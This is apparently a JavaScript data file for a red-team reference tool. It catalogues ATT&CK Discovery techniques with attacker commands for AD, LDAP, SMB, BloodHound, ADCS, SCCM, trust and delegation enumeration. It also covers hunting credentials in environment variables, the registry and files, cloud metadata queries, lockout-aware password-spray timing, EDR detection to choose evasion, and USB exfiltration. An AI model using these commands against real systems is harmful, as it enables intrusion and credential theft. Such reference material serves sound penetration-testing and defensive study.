export const DISCOVERY = {
  id: "discovery",
  name: "Discovery",
  tacticId: "TA0007",
  subtitle: "Account Discovery • Network Services • System Info • File Discovery • Process Enum • BloodHound • LDAP • SMB • DNS/ADIDNS • ADCS • SCCM • Trust Discovery • Delegation Enum • ACL Enum • GPO Discovery • Password Policy • Peripheral Devices • Network Shares • Remote Systems • Software Discovery • Cloud Services • Container Discovery • Browser Bookmarks",
  color: "#a78bfa",
  techniques: [
    {
      name: "Account Discovery",
      id: "T1087",
      summary: "net user • LDAP • AD users • cloud IAM • local accounts",
      description: "Enumerate user accounts and groups on local systems, domains, and cloud environments",
      tags: ["net user", "LDAP", "AD users", "T1087"],
      steps: [
        "Local account discovery (Windows):\n$ net user\n$ net localgroup administrators\n$ wmic useraccount get Name,SID,PasswordExpires,Disabled\n$ Get-LocalUser | Select Name,SID,Enabled",
        "Domain account enumeration:\n$ net user /domain\n$ net group 'Domain Admins' /domain\n$ net group 'Enterprise Admins' /domain\n$ Get-ADUser -Filter * -Properties * | Select SamAccountName,Enabled,LastLogonDate | Sort LastLogonDate\n# Also: LDAP query, BloodHound, PowerView",
        "PowerView AD enumeration:\n> Import-Module PowerView.ps1\n> Get-DomainUser -UACFilter NOT_ACCOUNTDISABLE -Properties SamAccountName,Description,MemberOf | fl\n> Get-DomainGroup -GroupName 'Domain Admins' | Select-Object -ExpandProperty Members\n> Get-DomainGroupMember -Identity 'Domain Admins' -Recurse",
        "AWS IAM enumeration:\n$ aws iam list-users\n$ aws iam list-groups\n$ aws iam list-roles\n$ aws iam get-account-authorization-details\n# Full account IAM dump\n$ pacu  # Automated AWS enumeration and exploitation",
        "Linux user enumeration:\n$ cat /etc/passwd | grep -v nologin | awk -F: '{print $1,$3}'\n$ getent passwd\n$ last  # Recent login history\n$ lastlog | grep -v 'Never logged in'\n# Find users with UID 0 (root equivalent):\n$ awk -F: '$3==0{print $1}' /etc/passwd"
      ]
    },
    {
      name: "Network Service Discovery",
      id: "T1046",
      summary: "nmap • netstat • arp • masscan • service fingerprinting",
      description: "Discover network services and open ports on local and remote systems",
      tags: ["nmap", "netstat", "masscan", "T1046"],
      steps: [
        "Port and service scan:\n$ nmap -sV -sC -O -p- 192.168.1.100 -oA nmap_target\n$ nmap -sV --script=default,vuln 192.168.1.0/24 -p 22,80,443,445,3389,8080 -oA nmap_net\n# -sC: default scripts, -sV: version, -O: OS, --script=vuln: vulnerability scan",
        "Fast network discovery:\n$ masscan -p0-65535 192.168.1.0/24 --rate=5000 -oJ masscan.json\n$ cat masscan.json | python3 -c \"import json,sys; [print(h['ip'],p['port'],p['service']['name']) for h in json.load(sys.stdin) for p in h['ports']]\" > hosts_ports.txt",
        "Internal network enumeration (no nmap):\n$ for i in {1..254}; do ping -c1 -W1 192.168.1.$i 2>/dev/null | grep 'bytes from' & done; wait\n$ nc -zv 192.168.1.100 1-1024 2>&1 | grep open\n> 1..1024 | % { try { (New-Object Net.Sockets.TcpClient).Connect('192.168.1.100',$_); \"Port $_ open\" } catch {} }\n# LOL - no tools needed",
        "Current connections and listening ports:\n$ netstat -tulnp  # Linux: ports and processes\n$ ss -tulnp  # Modern Linux alternative\n$ netstat -ano  # Windows: ports and PIDs\n> Get-NetTCPConnection -State Listen | Sort LocalPort\n# Current established connections - shows active communication",
        "SMB share enumeration:\n$ nxc smb 192.168.1.0/24 --shares\n$ smbclient -L //192.168.1.100 -N\n$ enum4linux-ng -A 192.168.1.100\n# -A: all: users, shares, OS info, password policy"
      ]
    },
    {
      name: "System Information Discovery",
      id: "T1082",
      summary: "systeminfo • uname • WMI • environment • kernel version",
      description: "Gather detailed system configuration, OS version, hardware, and environment info",
      tags: ["systeminfo", "uname", "WMI", "T1082"],
      steps: [
        "Windows — OS, domain, and hardware info:\n$ systeminfo\n# Single command: OS version, domain membership, hotfixes, network adapters, boot time\n$ systeminfo | findstr /B /C:'OS Name' /C:'OS Version' /C:'Domain' /C:'Hotfix'\n# Targeted: just what matters for attack planning\n$ wmic os get Caption,Version,BuildNumber,ServicePackMajorVersion /value\n$ wmic computersystem get Name,Domain,Manufacturer,Model /value\n# Domain membership = AD-joined = Kerberos/NTLM attacks applicable\n# OS build determines applicable CVEs and UAC bypass methods",
        "Linux — kernel, distro, and architecture:\n$ uname -a  # Kernel version + architecture — look up kernel CVEs immediately\n$ cat /etc/os-release  # Distribution + version (Ubuntu 22.04, RHEL 8.6, etc.)\n$ cat /proc/version  # Kernel compile info\n$ arch  # x86_64, aarch64 — affects which exploit binaries to use\n# Check kernel version for known LPE:\n$ uname -r  # e.g., 5.15.0-58-generic\n$ searchsploit linux kernel 5.15  # Check known exploits for this version\n# CPU features affecting exploitation:\n$ grep -i 'smep\\|smap\\|nx' /proc/cpuinfo  # Security mitigations",
        "Environment variables — high-value credential exposure:\n$ set  # Windows — dump ALL env vars\n$ env  # Linux — often reveals DB creds, API keys, cloud tokens\n# Specifically look for:\n$ env | grep -Ei 'password|passwd|secret|key|token|aws|azure|api'\n$ set | findstr -i 'password\\|secret\\|token\\|aws\\|key'\n# Common findings: DATABASE_URL=mysql://user:pass@host, AWS_ACCESS_KEY_ID, GITHUB_TOKEN\n# Docker containers: frequently have secrets injected as env vars\n# Service workers: often run with credentials needed for their function",
        "Patch level — identify missing security patches:\n$ wmic qfe get HotFixID,InstalledOn,Description | sort\n# Sort by date — if last patch was 2022, many CVEs since then\n# Cross-reference with: https://msrc.microsoft.com/update-guide\n$ powershell -c 'Get-HotFix | Sort InstalledOn -Descending | Select -First 10'\n# Recent Windows LPEs to check (if unpatched): PrintNightmare, noPac, HiveNightmare\n$ dpkg -l | grep linux-image  # Linux kernel package version\n$ rpm -qa | grep kernel  # RHEL/CentOS kernel version",
        "Installed software — security tools and vulnerable versions:\n$ wmic product get Name,Version | sort  # Windows installed software\n$ reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall /s /v DisplayName\n# Two objectives:\n# 1. Find security tools: CrowdStrike, Defender, Sysmon, etc. → choose evasion accordingly\n# 2. Find vulnerable software: specific versions of Apache, OpenSSL, Log4j, JDK\n$ tasklist | findstr -i 'CrowdStrike\\|Falcon\\|SentinelOne\\|Cylance\\|Carbon\\|CbDefense'\n# Linux:\n$ dpkg -l 2>/dev/null | grep -Ei 'apache|nginx|java|tomcat|openssl|openssh'\n$ rpm -qa 2>/dev/null | grep -Ei 'apache|java|tomcat'\n# Known-vulnerable: Apache 2.4.49 (path traversal), Log4j 2.0-2.14, OpenSSH < 8.5"
      ]
    },
    {
      name: "File and Directory Discovery",
      id: "T1083",
      summary: "dir • find • ls • filetype search • sensitive file hunting",
      description: "Enumerate the filesystem to find credentials, sensitive data, and interesting files",
      tags: ["find", "dir", "ls", "sensitive files", "T1083"],
      steps: [
        "Find sensitive files (Windows):\n$ dir /s /b C:\\ | findstr -i 'password\\|credential\\|.key\\|.pfx\\|.pem\\|.kdbx'\n$ findstr /si password *.xml *.ini *.txt *.config C:\\Users\\\n$ dir /s /b C:\\Users\\*.rdg  # RDP credential files\n$ dir /s /b C:\\Users\\*.cred",
        "Find sensitive files (Linux):\n$ find / -name '*.key' -o -name '*.pem' -o -name '*.pfx' -o -name '*.p12' 2>/dev/null\n$ find / -name 'id_rsa' -o -name '*.ssh' -o -name 'authorized_keys' 2>/dev/null\n$ find / -name '.htpasswd' -o -name 'wp-config.php' -o -name 'database.yml' 2>/dev/null\n$ find /var/www -name 'config.php' 2>/dev/null\n# Web app config files often contain database credentials",
        "Recently modified files (signs of activity):\n$ find / -newer /tmp/ref_file -type f 2>/dev/null\n$ find / -mtime -7 -type f 2>/dev/null  # Modified in last 7 days\n$ dir /tc C:\\Windows\\Temp\\  # Creation time",
        "Search for backup files:\n$ find / -name '*.bak' -o -name '*.backup' -o -name '*.old' -o -name '*.orig' 2>/dev/null\n$ find / -name '*.tar' -o -name '*.tar.gz' -o -name '*.zip' 2>/dev/null\n# Backup files often contain old/current passwords",
        "Look for script files with credentials:\n$ grep -rn 'password\\|passwd\\|secret\\|apikey\\|token' /opt/ /srv/ /var/www/ --include='*.sh' --include='*.py' --include='*.rb' --include='*.js' 2>/dev/null"
      ]
    },
    {
      name: "Process Discovery",
      id: "T1057",
      summary: "tasklist • ps • Get-Process • WMI • process parent enumeration",
      description: "Enumerate running processes to identify security tools, interesting applications, and opportunities",
      tags: ["tasklist", "ps", "Get-Process", "T1057"],
      steps: [
        "Windows process enumeration:\n$ tasklist /svc\n$ tasklist /v\n$ wmic process get Name,ProcessId,CommandLine,ParentProcessId /value\n> Get-Process | Select Name,Id,Path | Sort Name\n> Get-CimInstance Win32_Process | Select Name,ProcessId,CommandLine,ParentProcessId",
        "Identify security tools in process list:\n$ tasklist | findstr -i 'CrowdStrike\\|Defender\\|Carbon\\|Cylance\\|SentinelOne\\|Sophos\\|McAfee\\|Symantec\\|FireEye\\|Palo Alto'\n# Presence of EDR: choose evasion techniques accordingly\n# No AV: less stringent evasion needed",
        "Linux process enumeration:\n$ ps aux\n$ ps -ef --forest\n$ ps -eo pid,ppid,user,cmd\n# --forest: shows parent-child relationships\n$ cat /proc/*/cmdline 2>/dev/null | tr '\\0' ' ' | sort -u\n# Read all process command lines from /proc",
        "Find processes running as root:\n$ ps aux | grep '^root'\n# Look for vulnerable services, non-standard processes\n# SUID processes: find / -perm -4000 2>/dev/null",
        "Process analysis with detailed info:\n$ lsof -p <PID>  # Files and network connections\n$ strace -p <PID>  # System calls (attach to running process)\n# Windows: handle.exe, procexp.exe for detailed process info"
      ]
    },
    {
      name: "Query Registry",
      id: "T1012",
      summary: "reg query • PowerShell • installed software • autostart • credentials",
      description: "Query Windows Registry for system configuration, installed software, and stored credentials",
      tags: ["reg query", "PowerShell", "registry", "T1012"],
      steps: [
        "Query common registry locations:\n$ reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\n$ reg query HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\n$ reg query HKLM\\SYSTEM\\CurrentControlSet\\Services /s\n# Autostart, services, installed software",
        "Search for credentials in registry:\n$ reg query HKCU /f 'password' /t REG_SZ /s\n$ reg query HKLM /f 'password' /t REG_SZ /s\n$ reg query 'HKLM\\SOFTWARE\\OpenSSH' /s\n# Search all keys for password strings",
        "AutoLogon credentials (common misconfiguration):\n$ reg query 'HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon' /v DefaultPassword\n$ reg query 'HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon' /v DefaultUsername\n# AutoLogon stores password in plaintext",
        "PuTTY saved sessions:\n$ reg query HKCU\\Software\\SimonTatham\\PuTTY\\Sessions /s\n# May contain usernames and proxy passwords\n# SSH keys references for finding private keys",
        "Internet Explorer and RDP credentials:\n$ reg query HKCU\\Software\\Microsoft\\Terminal Server Client\\Servers /s\n$ reg query 'HKCU\\Software\\Microsoft\\Internet Explorer\\IntelliForms\\Storage2'\n# IE stores encrypted form data including passwords\n# Decrypt with DPAPI"
      ]
    },
    {
      name: "Cloud Infrastructure Discovery",
      id: "T1580",
      summary: "AWS enumerate • Azure • GCP • cloud resources • IAM perms",
      description: "Enumerate cloud infrastructure, services, and permissions in AWS, Azure, and GCP",
      tags: ["AWS", "Azure", "GCP", "cloud enum", "T1580"],
      steps: [
        "AWS resource enumeration:\n$ aws sts get-caller-identity\n$ aws s3 ls\n$ aws ec2 describe-instances --region us-east-1\n$ aws ec2 describe-security-groups\n$ aws iam get-account-summary\n$ aws lambda list-functions\n# Automated: Pacu, ScoutSuite, Prowler",
        "Azure resource enumeration:\n$ az account list\n$ az resource list\n$ az vm list\n$ az storage account list\n$ az keyvault list\n$ az role assignment list --all\n# Automated: AzureHound, ScoutSuite",
        "GCP enumeration:\n$ gcloud compute instances list\n$ gcloud sql instances list\n$ gcloud iam service-accounts list\n$ gcloud projects get-iam-policy PROJECT_ID\n# Automated: GCPBucketBrute, ScoutSuite",
        "S3 bucket enumeration (public):\n$ aws s3 ls s3://target-company\n$ aws s3 ls s3://target-backup --no-sign-request\n$ s3scanner scan --bucket-file buckets.txt\n# Common patterns: company-backup, company-data, company-prod-logs\n# Some buckets are public-read",
        "Cloud metadata service:\n$ curl http://169.254.169.254/latest/meta-data/  # AWS\n$ curl -H 'Metadata: true' http://169.254.169.254/metadata/instance?api-version=2021-02-01  # Azure\n$ curl http://metadata.google.internal/computeMetadata/v1/ -H 'Metadata-Flavor: Google'  # GCP\n# Credentials, user data, IAM roles"
      ]
    },
    {
      name: "Password Policy Discovery",
      id: "T1201",
      summary: "net accounts • AD policy • account lockout • complexity rules",
      description: "Identify password policies to optimize brute force and spraying attacks",
      tags: ["net accounts", "AD policy", "lockout", "T1201"],
      steps: [
        "Windows domain password policy:\n$ net accounts /domain\n$ Get-ADDefaultDomainPasswordPolicy\n$ nxc smb DC_IP -u user -p pass --pass-pol\n# Key info: lockout threshold, observation window, min password length",
        "Fine-Grained Password Policies (FGPP):\n> Get-ADFineGrainedPasswordPolicy -Filter * | Select Name,Precedence,LockoutThreshold,LockoutDuration,MinPasswordLength\n> Get-ADFineGrainedPasswordPolicySubject -Identity 'Admins PSO'\n# Different policies for different groups\n# Admin accounts may have NO lockout (spray safely)",
        "Linux PAM password policy:\n$ cat /etc/pam.d/common-password\n$ cat /etc/security/pwquality.conf\n$ cat /etc/login.defs | grep PASS\n# Min length, complexity, lockout settings",
        "Use policy for optimal spray:\n# Lockout threshold = 5, observation = 30 min\n# Spray 4 passwords per 30 minute window\n# Most common patterns: Summer2024!, Password1, Company@2024\n# Focus on common seasonal passwords",
        "Check if account is already locked:\n$ net user <username> /domain | findstr -i 'lock\\|active'\n> Get-ADUser -Identity <username> -Properties LockedOut,BadPwdCount | Select Name,LockedOut,BadPwdCount"
      ]
    },
    {
      name: "Peripheral Device Discovery",
      id: "T1120",
      summary: "USB devices • printers • cameras • removable media • hardware",
      description: "Enumerate connected peripheral devices for data exfiltration opportunities and pivoting",
      tags: ["USB", "printers", "removable media", "T1120"],
      steps: [
        "Enumerate USB and removable devices:\n$ wmic logicaldisk get Caption,DriveType,VolumeName | findstr 'Drive'\n# DriveType 2 = removable\n$ Get-WmiObject Win32_USBControllerDevice | ForEach { [wmi]$_.Dependent } | Select Name,DeviceID\n$ reg query HKLM\\SYSTEM\\CurrentControlSet\\Enum\\USB /s\n# Historical USB device connections",
        "Network printer discovery:\n$ nmap -p 9100,515,631 192.168.1.0/24 -sV\n# Port 9100: raw printing, 515: LPD, 631: IPP\n$ nxc smb 192.168.1.0/24 -u user -p pass --shares | grep print\n# Printers: internal spool files, stored credentials, memory dumps",
        "Linux device enumeration:\n$ lsusb\n$ lsblk\n$ fdisk -l\n$ cat /proc/scsi/scsi\n# Removable media, storage devices",
        "Webcam and audio devices:\n$ wmic path win32_pnpentity where \"Caption like '%camera%'\" get Caption\n# Useful for: identify systems with cameras (surveillance, executive)\n# Not directly exploitable without code execution",
        "Data exfil via removable media:\n# If USB is present: copy files to USB\n$ robocopy C:\\Users\\%USERNAME%\\Documents E:\\ *.docx *.xlsx *.pdf /s /z\n# Air-gapped systems: only via physical media"
      ]
    },
    {
      name: "Bloodhound",
      id: "T1069.BH",
      summary: "SharpHound • bloodhound-python • attack path analysis",
      description: "Enumerate Active Directory relationships and identify attack paths to privileged targets using BloodHound",
      tags: ["BloodHound", "SharpHound", "bloodhound-python", "T1069"],
      steps: [
        "Step 1 — Run SharpHound collector to ingest AD data:\n# BloodHound works by collecting AD data (users, groups, computers, ACLs, sessions, GPOs)\n# then visualizing attack paths in a graph database\n$ SharpHound.exe -c All --zipfilename bh_loot.zip\n# -c All: collects ALL data types: sessions, trusts, ACLs, GPOs, containers, ObjectProps\n# Stealth mode (fewer LDAP queries, less noisy):\n$ SharpHound.exe -c All,GPOLocalGroup --stealth --zipfilename bh_loot.zip\n# From Linux (no domain-joined machine needed, only network access to DC):\n$ bloodhound-python -d domain.com -u user -p pass -ns DC_IP -c All --zip\n# Output: zip file containing JSON files for each data type",
        "Step 2 — Import and start BloodHound analysis:\n$ sudo neo4j start  # Start graph database backend\n# Open BloodHound app, click Upload Data, import zip/JSON\n# Start with pre-built queries — most useful:\n# 'Find Shortest Paths to Domain Admins'\n# 'Find Principals with DCSync Rights'\n# 'Find Computers where Domain Users are Local Admin'\n# 'Shortest Path from Owned Principals'\n# Mark compromised accounts as 'Owned' (right-click node) to enable owned-path queries",
        "Step 3 — Identify high-value attack paths:\n# The most common paths from low-priv to DA:\n# GenericAll/GenericWrite on user → shadow creds or password reset → DA path\n# WriteDACL on group → grant yourself GenericAll → add yourself to DA\n# AllExtendedRights on user → ForceChangePassword or targeted Kerberoast\n# MemberOf privileged group → direct access\n# AdminTo on many computers → find one with DA session → dump LSASS → get DA hash\n# Shortest path in BloodHound: follow the edges — each edge = one exploitable permission",
        "Step 4 — Custom Cypher queries for targeted analysis:\n# Find all computers where current user is local admin:\n$ MATCH p=(u:User {name:'DOMAIN\\\\USERNAME@DOMAIN.COM'})-[r:AdminTo]->(c:Computer) RETURN p\n# Find path from Kerberoastable users to Domain Admins:\n$ MATCH p=shortestPath((u:User {hasspn:true})-[*1..]->(g:Group {name:'DOMAIN ADMINS@DOMAIN.COM'})) RETURN p\n# Find users with DCSync rights (non-DA accounts):\n$ MATCH p=(u:User)-[r:DCSync|AllExtendedRights|GenericAll]->(d:Domain) RETURN p\n# Find all users with sessions on DA machines:\n$ MATCH p=(u:User)-[r:HasSession]->(c:Computer)<-[r2:AdminTo]-(g:Group {name:'DOMAIN ADMINS@DOMAIN.COM'}) RETURN p",
        "Step 5 — Interpret and exploit attack paths:\n# Every edge in BloodHound = an exploitable action:\n# ForceChangePassword → net rpc password or changepasswd.py\n# GenericWrite → pywhisker add (shadow creds) or targetedKerberoast\n# AddMember → net group 'Domain Admins' attacker /add /domain\n# WriteDACL → dacledit.py -action write → grant GenericAll\n# AdminTo → psexec.py / wmiexec.py to get shell → dump LSASS\n# HasSession → target that machine when DA session is present\n# Always verify paths are still valid — sessions change, permissions change\n$ Invoke-BloodHound -CollectionMethod Session  # Refresh sessions only (quick, less noise)"
      ]
    },
    {
      name: "LDAP Discovery",
      id: "T1087.LDAP",
      summary: "ldapsearch • ldap3 • windapsearch • nxc ldap",
      description: "Query LDAP to enumerate users, groups, computers, trusts, and AD configuration",
      tags: ["ldapsearch", "windapsearch", "nxc", "T1087"],
      steps: [
        "Basic LDAP enumeration with ldapsearch:\n$ ldapsearch -x -H ldap://DC_IP -b 'DC=domain,DC=com' -D 'domain\\user' -w pass '(objectClass=user)' sAMAccountName memberOf\n$ ldapsearch -x -H ldap://DC_IP -b 'DC=domain,DC=com' '(objectClass=computer)' name operatingSystem\n# Enumerate all users and computers anonymously or with creds",
        "windapsearch for targeted AD queries:\n$ python3 windapsearch.py --dc-ip DC_IP -d domain.com -u user -p pass --users\n$ python3 windapsearch.py --dc-ip DC_IP -d domain.com -u user -p pass --da\n$ python3 windapsearch.py --dc-ip DC_IP -d domain.com -u user -p pass --groups\n# --da: enumerate Domain Admins; --unconstrained: delegation accounts",
        "netexec LDAP enumeration:\n$ nxc ldap DC_IP -u user -p pass --users\n$ nxc ldap DC_IP -u user -p pass --groups\n$ nxc ldap DC_IP -u user -p pass --trusted-for-delegation\n$ nxc ldap DC_IP -u user -p pass --password-not-required\n# Enumerate accounts without pre-auth or with delegation configured",
        "Enumerate privileged groups:\n$ nxc ldap DC_IP -u user -p pass -M get-desc-users\n$ ldapsearch -x -H ldap://DC_IP -b 'DC=domain,DC=com' '(memberOf=CN=Domain Admins,CN=Users,DC=domain,DC=com)' sAMAccountName\n# Also check: Schema Admins, Enterprise Admins, Account Operators\n$ ldapsearch -x -H ldap://DC_IP -b 'DC=domain,DC=com' '(adminCount=1)' sAMAccountName",
        "Enumerate AD password policy and fine-grained policies:\n$ nxc ldap DC_IP -u user -p pass --pass-pol\n$ Get-ADDefaultDomainPasswordPolicy\n$ Get-ADFineGrainedPasswordPolicy -Filter *\n# Lockout threshold → determine safe spray rate\n# Fine-grained policies may have different thresholds per group"
      ]
    },
    {
      name: "SMB Discovery",
      id: "T1135.SMB",
      summary: "enum4linux • smbclient • nxc smb • share discovery",
      description: "Enumerate SMB shares, sessions, local users, and group memberships across the network",
      tags: ["enum4linux", "smbclient", "nxc", "T1135"],
      steps: [
        "Enumerate SMB shares with netexec:\n$ nxc smb 192.168.1.0/24 -u user -p pass --shares\n$ nxc smb DC_IP -u user -p pass --shares --filter-shares READ WRITE\n# Lists all accessible shares and permission level\n# Look for: SYSVOL, NETLOGON, custom shares with sensitive data",
        "enum4linux-ng full SMB enumeration:\n$ enum4linux-ng -A -u user -p pass DC_IP\n# -A: all checks (users, shares, groups, OS info, password policy)\n$ enum4linux-ng -R -u user -p pass DC_IP  # RID brute force for user enumeration",
        "smbclient browsing:\n$ smbclient -L //DC_IP -U 'domain\\user%pass'\n$ smbclient //DC_IP/SYSVOL -U 'domain\\user%pass'\n# Browse SYSVOL for GPO scripts, preferences\n$ smbclient //server/share -U 'domain\\user%pass' -c 'ls; recurse ON; ls'\n# Recursive listing to find interesting files",
        "Find writable shares (data exfil / payload delivery):\n$ nxc smb 192.168.1.0/24 -u user -p pass --shares | grep WRITE\n$ nxc smb 192.168.1.0/24 -u user -p pass -M spider_plus\n# spider_plus: recursively list share content, find sensitive files\n# Look for: .txt, .xml, .config with passwords",
        "Enumerate active sessions and logged-on users:\n$ nxc smb 192.168.1.0/24 -u user -p pass --sessions\n$ nxc smb 192.168.1.0/24 -u user -p pass --loggedon-users\n# Identify high-value targets currently logged on\n# Prioritize systems with Domain Admin sessions"
      ]
    },
    {
      name: "DNS / ADIDNS Discovery",
      id: "T1590.DNS",
      summary: "dnstool • adidnsdump • nxc dns • zone enum",
      description: "Enumerate Active Directory Integrated DNS zones and records to map internal infrastructure",
      tags: ["adidnsdump", "dnstool", "ADIDNS", "T1590"],
      steps: [
        "Dump all ADIDNS records with adidnsdump:\n$ adidnsdump -u domain\\user -p pass DC_IP\n$ adidnsdump -u domain\\user -p pass DC_IP --include-tombstoned\n# Dumps all DNS records from AD via LDAP\n# More comprehensive than DNS zone transfer\n# Reveals internal hostnames, IP addresses",
        "Query DNS records with dnstool:\n$ python3 dnstool.py -u domain\\user -p pass -a query -r '*' DC_IP\n$ python3 dnstool.py -u domain\\user -p pass -a query -r '*.corp' DC_IP\n# Enumerate wildcard records, all zones\n# Useful for discovering internal infrastructure",
        "netexec DNS enumeration:\n$ nxc ldap DC_IP -u user -p pass -M adidns\n# Queries ADIDNS over LDAP\n# Returns all DNS records in AD-integrated zones",
        "Manual LDAP query for DNS records:\n$ ldapsearch -x -H ldap://DC_IP -b 'DC=DomainDnsZones,DC=domain,DC=com' '(objectClass=dnsNode)' name dnsRecord\n# Direct LDAP query to DNS partition\n# Tombstoned records may reveal historical hosts",
        "Check for wildcard DNS records (ADIDNS attack surface):\n$ python3 dnstool.py -u domain\\user -p pass -a query -r '*' DC_IP\n# Wildcard = any DNS name resolves to same IP\n# Enables NTLM relay via rogue hostnames\n# Absence of wildcard = can register arbitrary names → poisoning attack"
      ]
    },
    {
      name: "ADCS Discovery",
      id: "T1649.enum",
      summary: "Certify find • certipy find • template enumeration",
      description: "Enumerate Active Directory Certificate Services templates and configurations for privilege escalation paths",
      tags: ["Certify", "certipy", "ADCS", "T1649"],
      steps: [
        "Enumerate vulnerable certificate templates with Certify:\n$ Certify.exe find /vulnerable\n$ Certify.exe find /vulnerable /currentuser\n# Finds templates with dangerous configurations:\n# ESC1: any user can enroll with SAN\n# ESC2: any purpose template with enroll rights\n# ESC3: enrollment agent template abuse",
        "Enumerate with certipy (Linux):\n$ certipy find -u user@domain.com -p pass -dc-ip DC_IP\n$ certipy find -u user@domain.com -p pass -dc-ip DC_IP -vulnerable -stdout\n# -vulnerable: only show templates with known vulnerabilities\n# Outputs JSON and text report with ESC classifications",
        "Enumerate CA servers and permissions:\n$ Certify.exe cas\n$ certipy find -u user@domain.com -p pass -dc-ip DC_IP -text -output ca_enum\n# Find Certificate Authorities\n# Check: who can issue certs, manage CA, backup CA\n# CA Admins/Cert Managers = high privilege",
        "Check enrollment rights on templates:\n$ Certify.exe find /enrolleeSuppliesSubject\n# enrolleeSuppliesSubject + low-priv enroll = ESC1\n$ ldapsearch -x -H ldap://DC_IP -b 'CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=com' '(objectClass=pKICertificateTemplate)' name msPKI-Certificate-Name-Flag\n# msPKI-Certificate-Name-Flag: 1 = client can supply SAN",
        "Map ADCS attack surface:\n# ESC1: Template allows SAN + low priv enroll → request cert as DA\n# ESC2: Template has Any Purpose EKU\n# ESC4: Template has write permissions for low-priv user\n# ESC6: EDITF_ATTRIBUTESUBJECTALTNAME2 flag on CA\n# ESC8: NTLM relay to HTTP enrollment endpoint\n$ certipy find -u user@domain.com -p pass -dc-ip DC_IP -vulnerable"
      ]
    },
    {
      name: "SCCM Discovery",
      id: "T1018.SCCM",
      summary: "sccmhunter • SharpSCCM • site server discovery",
      description: "Enumerate Microsoft SCCM/ConfigMgr infrastructure to identify credential exposure and lateral movement paths",
      tags: ["sccmhunter", "SharpSCCM", "SCCM", "T1018"],
      steps: [
        "Discover SCCM infrastructure with sccmhunter:\n$ python3 sccmhunter.py find -u user -p pass -d domain.com -dc DC_IP\n# Discovers Management Points, Distribution Points, Site Servers\n# Queries AD for SCCM-related objects and SPN registrations",
        "Enumerate SCCM with SharpSCCM:\n$ SharpSCCM.exe local site-info\n$ SharpSCCM.exe get site-info -sms SMS_SITE_SERVER\n$ SharpSCCM.exe get devices -sc SMS_SITE_SERVER -sms SMS_MANAGEMENT_POINT\n# Enumerate managed devices, collections, deployments",
        "Find Network Access Account (NAA) credentials:\n$ SharpSCCM.exe local naa -sms SMS_MANAGEMENT_POINT\n$ python3 sccmhunter.py smb -u user -p pass -d domain.com -dc DC_IP -naa\n# NAA credentials stored on managed clients\n# Often domain account with broad access\n# Decrypt from WMI repository: HKLM\\SOFTWARE\\Microsoft\\SMS\\DP",
        "Enumerate SCCM policies and task sequences:\n$ SharpSCCM.exe get classes-user -sc SITECODE -sms MANAGEMENT_POINT\n$ python3 sccmhunter.py http -u user -p pass -d domain.com -dc DC_IP\n# Task sequences may contain embedded credentials\n# Request policy over HTTP (unauthenticated if HTTP fallback enabled)",
        "Check SCCM admin rights:\n$ SharpSCCM.exe get admins -sms MANAGEMENT_POINT -sc SITECODE\n# SCCM Full Admin = push scripts/apps to all managed machines\n# Site Server computer account is local admin on all managed endpoints\n# Compromise site server = access to all SCCM-managed machines"
      ]
    },
    {
      name: "Trust Discovery",
      id: "T1482.enum",
      summary: "nltest • Get-ADTrust • BH trust mapping • inter-forest",
      description: "Enumerate Active Directory domain and forest trusts to identify lateral movement paths across trust boundaries",
      tags: ["nltest", "Get-ADTrust", "BloodHound", "T1482"],
      steps: [
        "Enumerate domain trusts:\n$ nltest /domain_trusts\n$ nltest /dclist:domain.com\n$ Get-ADTrust -Filter *  | Select Name,TrustType,TrustDirection,TrustAttributes\n# TrustDirection: Bidirectional, Inbound, Outbound\n# TrustType: ParentChild, External, Forest",
        "Enumerate with netexec:\n$ nxc ldap DC_IP -u user -p pass -M enum_trusts\n# Also via bloodhound-python - maps trusts automatically\n$ bloodhound-python -d domain.com -u user -p pass -ns DC_IP -c Trusts",
        "Manual LDAP query for trust objects:\n$ ldapsearch -x -H ldap://DC_IP -b 'CN=System,DC=domain,DC=com' '(objectClass=trustedDomain)' name trustDirection trustAttributes flatName\n# trustDirection: 1=inbound, 2=outbound, 3=bidirectional\n# trustAttributes: 8=forest, 32=within forest, 64=SID filtering disabled",
        "Check SID filtering status:\n$ netdom trust CHILD_DOMAIN /domain:PARENT_DOMAIN /quarantine\n# SID filtering disabled = SID history injection possible\n# External trusts often have SID filtering disabled\n# Forest trusts: SID filtering enabled by default",
        "Map trust paths in BloodHound:\n# Nodes: TrustedBy / TrustedBy relationship edges\n# Query: MATCH p=(d:Domain)-[r:TrustedBy]->(d2:Domain) RETURN p\n# Identify: can a compromised domain lead to forest root?\n# Child domains can always escalate to forest root via trust"
      ]
    },
    {
      name: "Delegation Discovery",
      id: "T1558.denum",
      summary: "findDelegation • BH Cypher • unconstrained • constrained • RBCD",
      description: "Enumerate all Kerberos delegation configurations to identify privilege escalation and impersonation paths",
      tags: ["findDelegation", "BloodHound", "delegation", "T1558"],
      steps: [
        "Find all delegation types with findDelegation:\n$ findDelegation.py domain.com/user:pass -dc-ip DC_IP\n# Returns: unconstrained, constrained (with protocol transition), and RBCD\n# Shows which accounts/computers can delegate and to what services",
        "Enumerate unconstrained delegation:\n$ Get-ADComputer -Filter {TrustedForDelegation -eq $true} -Properties TrustedForDelegation,DNSHostName\n$ Get-ADUser -Filter {TrustedForDelegation -eq $true}\n$ nxc ldap DC_IP -u user -p pass --trusted-for-delegation\n# Any computer/user with unconstrained delegation = high value\n# DC itself is always unconstrained - expected",
        "Enumerate constrained delegation:\n$ Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne '$null'} -Properties msDS-AllowedToDelegateTo,sAMAccountName\n# Shows: which accounts can delegate and to which SPNs\n# Protocol transition flag: TrustedToAuthForDelegation = True",
        "Enumerate RBCD (msDS-AllowedToActOnBehalfOfOtherIdentity):\n$ Get-ADComputer -Filter * -Properties msDS-AllowedToActOnBehalfOfOtherIdentity | Where {$_.msDS-AllowedToActOnBehalfOfOtherIdentity -ne $null}\n$ python3 rbcd.py -t TARGET$ -dc-ip DC_IP domain.com/user:pass --check\n# Any computer with RBCD configured is a potential PrivEsc path",
